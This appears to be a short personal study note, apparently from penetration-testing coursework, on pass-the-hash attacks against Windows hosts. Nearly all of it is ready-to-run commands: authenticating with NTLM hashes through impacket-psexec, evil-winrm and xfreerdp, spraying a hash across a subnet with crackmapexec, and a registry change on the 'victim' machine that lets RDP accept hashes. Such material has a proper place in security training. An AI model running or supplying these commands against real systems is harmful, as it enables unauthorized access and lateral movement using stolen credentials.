
Impacket
```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
https://github.com/SecureAuthCorp/impacket

![[Pasted image 20240915153223.png]]

Crackmapexec
```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
https://github.com/byt3bl33d3r/CrackMapExec


evilwinrm
```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
https://github.com/Hackplayers/evil-winrm
![[Pasted image 20240912141139.png]]



Enabling RDP PTH
![[Pasted image 20240915160815.png]]``

On victim machine 
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

On attacker machine
```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


Extra Notes:
![[Pasted image 20240915161140.png]]